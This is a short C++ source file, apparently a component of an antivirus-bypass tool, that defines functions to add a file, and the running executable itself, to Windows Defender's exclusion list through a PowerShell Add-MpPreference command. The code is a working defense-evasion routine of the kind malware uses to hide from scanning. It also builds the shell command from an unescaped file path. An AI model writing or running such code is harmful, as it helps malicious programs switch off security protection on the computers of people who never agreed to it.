//
// Created by MateuszAndruszkiewic on 17.12.2024.
//
#include "../../../lib/beauty_print.cpp"
#include "av_bypass.h"
#include <windows.h>
#include <iostream>
#include <string>

bool AddToDefenderExclusions(const std::wstring& filePath) {
    std::wstring command = L"powershell -Command \"Add-MpPreference -ExclusionPath '";
    command += filePath;
    command += L"'\"";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        printSuccess("Added to Windows Defender exclusions");
        return true;
    }
    printError("Failed to add to Windows Defender exclusions");
    return false;
}

bool AddCurrentExecutableToDefenderExclusions() {
    wchar_t filePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, filePath, MAX_PATH) != 0) {
        return AddToDefenderExclusions(filePath);
    }
    return false;
}